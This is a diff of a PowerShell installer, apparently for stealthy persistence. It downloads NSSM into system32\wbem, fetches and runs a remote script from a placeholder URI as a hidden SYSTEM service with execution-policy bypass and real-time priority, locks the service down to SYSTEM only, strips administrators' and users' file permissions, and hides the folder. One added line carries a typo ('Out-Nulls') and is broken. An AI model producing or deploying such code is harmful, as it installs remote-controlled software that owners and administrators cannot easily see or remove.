@@ -1,29 +1,44 @@
 # script must run as admin/SYSTEM
+param(
+    [string]$rootPath
+)
+
+$paths = @(
+    "$env:windir\system32\config\systemprofile\AppData\Local"
+)
+
 $nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
 $nssmFolder = "$env:windir\system32\wbem\nssm"
 $nssmexe = "$nssmFolder\nssm.exe"
-$scriptPath = "path\to\root_script.ps1"
-$serviceName = "MyService"
+
+if(($rootPath -eq "") -or ($rootPath -eq $null)){
+    $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+    $rootPath = "$rootPath\root.ps1"
+}
+
+$idx = Get-Random -Minimum 0 -Maximum $paths.Length
+$scriptPath = $paths[$idx]
+$scriptPath = "$scriptPath\root_mon.ps1"
+
+$serviceName = "MyRootMonService"
 $exePath = "powershell.exe"
-$arguments = "-ep bypass -noP -w hidden $scriptPath"
+$arguments = "-ep bypass -noP -w hidden $scriptPath -rootPath $rootPath"
 $downloadPath = "$env:temp\nssm.zip"
 
 if(-not(Test-Path -Path $nssmFolder -PathType Container)){
     New-Item -Path $nssmFolder -ItemType Directory -Force
 }
 
-if(-not(Test-Path -Path $downloadPath)){
-    iwr -Uri $nssmUrl -OutFile $downloadPath
+if(-not(Test-Path -Path $nssmexe)){
+    if(-not(Test-Path -Path $downloadPath)){
+        iwr -Uri $nssmUrl -OutFile $downloadPath
+    }
+    Expand-Archive -Path $downloadPath -DestinationPath $env:temp
+    Move-Item -Path "$env:temp\nssm-2.24\win64\nssm.exe" -Destination $nssmexe
 }
-
-Expand-Archive -Path $downloadPath -DestinationPath $env:temp
 
 if(-not(Test-Path -Path $scriptPath -PathType Leaf)){
-    iwr -Uri "ROOT_SCRIPT_URI" -OutFile $scriptPath
-}
-
-if(-not(Test-Path -Path $nssmexe -PathType Leaf)){
-    Move-Item -Path "$env:temp\nssm-2.24\win64\nssm.exe" -Destination $nssmexe
+    iwr -Uri "ROOT_MON.ps1_URI" -OutFile $scriptPath
 }
 
 Remove-Item -Path $downloadPath -Force -Recurse
@@ -40,6 +55,8 @@ if(Get-Service -Name $serviceName -ErrorAction SilentlyContinue){
 & $nssmexe set $serviceName AppExit Default Exit
 & $nssmexe set $serviceName AppExit 0 Exit
 & $nssmexe set $serviceName AppPriority REALTIME_PRIORITY_CLASS
+& $nssmexe set $serviceName AppStdout "$env:userprofile\Downloads\root_mon_srv.log"
+& $nssmexe set $serviceName AppStderr "$env:userprofile\Downloads\root_mon_srv.log.error"
 & $nssmexe start $serviceName
 
 $SDDL = "O:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
@@ -66,8 +83,7 @@ icacls $scriptPath /remove:g "BUILTIN\Administrators" "BUILTIN\Users" "Everyone"
 
 # 4. Explicitly remove your user account
 icacls $nssmexe /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Null
-icacls $scriptPath /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Null
-
+icacls $scriptPath /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Nulls
 
 
 attrib +h +s +r $nssmFolder
